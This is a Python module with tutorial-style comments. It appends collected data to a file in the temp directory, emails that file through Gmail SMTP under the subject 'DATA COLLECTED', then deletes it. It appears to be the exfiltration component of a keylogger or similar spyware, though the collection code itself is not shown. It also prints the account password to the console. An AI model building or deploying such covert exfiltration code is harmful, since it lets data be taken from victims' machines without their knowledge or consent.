import smtplib
import tempfile
import os
import argparse
# Multipurpose Internet Mail Extensions MIME FULL FORM
# MIMEMultipart is for saying "I have more than one part", and then listing the parts
from email.mime.multipart import MIMEMultipart
# - you do that if you have attachments, you also do it to provide alternative versions
# of the same content (e.g. a plain text version plus an HTML version)
# MIMEText is for text (e.g. text/plain or text/html),
from email.mime.text import MIMEText
# if the whole message is in text format, or if a part of it is.
# MIMEBase is just a base class. As the specification says:
from email.mime.base import MIMEBase
#"Ordinarily you won’t create instances specifically of MIMEBase"
from email import encoders


class Extension:
    def mail_and_password(self):
        parser=argparse.ArgumentParser()
        parser.add_argument("-m","--mail",dest="email_address",help="Enter your mail using this option")
        parser.add_argument("-p","--password",dest="email_password",help="Enter your mail password using this option")
        options=parser.parse_args()
        return options.email_address,options.email_password
    def mail(self, address, password, file_name):
        # If a message has a multipart Content-Type, that means it consists of multiple messages and
        message = MIMEMultipart()
# each of them defines its own Content-Type (which can again be multipart or something else).
# Multipart messages are in Python represented by MIMEMultipart class
        message["From"] = address
        message["To"] = address
        message["Subject"] = "DATA COLLECTED"
        body = "TASK COMPLETED"
        message.attach(MIMEText(body, "plain"))
        attachment = file_name
        # rb stands for read binary data
        file_attached = open(attachment, 'rb')
# Any kind of binary data that doesn't fall explicitly into one of the other types;
# either data that will be executed or interpreted in some way or binary data that requires a
# specific application or category of application to use. Generic binary data (or binary data whose true type is unknown)
# is application/octet-stream. Other common examples include application/pdf, application/pkcs8, and application/zip.
        payload = MIMEBase("application", "octate-stream")
        # The Content-Type header is used to indicate the media type of the resource.
        # The media type is a string sent along with the file indicating the format of the file.
        # Sub divisons media-type,charset & boundary
        # For example, for image file its media type will be like image/png or image/jpg, etc.
        payload.set_payload((file_attached).read())
        # The term Base64 originates from a specific MIME content transfer encoding.
        encoders.encode_base64(payload)
        # Each non-final Base64 digit represents exactly 6 bits of data.
        # Base64 is also widely used for sending e-mail attachments.
        # This is required because SMTP—in its original form—was designed to transport 7-bit ASCII characters only.

        # TO use disposition not Decomposition "" or '' doesn't matter
        payload.add_header("Content-Disposition",
                           "attachment", filename=attachment)
        # In a regular HTTP response, the Content-Disposition response header is a header indicating if the content is
        # expected to be displayed inline in the browser, that is, as a Web page or as part of a Web page, or as an attachment,
        # that is downloaded and saved locally.
        message.attach(payload)
        # First server mail id and then port number of server.
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  # Start server
        # Provide server with email id and password
        server.login(address, password)
        # Emaid id of sender first then recipent and at last message
        command = message.as_string()
        server.sendmail(address, address, command)
        server.quit()  # Send end request to server

    def store_data(self, file_name, data):
        # This class is cross compatible and with the gettempdir function we can get temporary directory of any os without
        temporary = tempfile.gettempdir()
        # having to mention it's original location which are differnet in different OS'es
        os.chdir(temporary)
        # file name we want to access or create
        # built in function used to create any kind of object inside the directory we are working
        with open(file_name, "a") as sample_file:
            # wb stands for write binary into file #name of file that we will be using to refrence it later on
            # To write the binary data into the sample file{originally named extension) created.
            sample_file.write(data)
            sample_file.write("\n")
#The self is used to represent the instance of the class. 
# With this keyword, you can access the attributes and methods of the class in python. 
# It binds the attributes with the given arguments. 
    def start(self, file_name):
        address,password=self.mail_and_password()
        print(address,"\n",password)
        self.mail(address, password, file_name)
        os.remove(file_name)
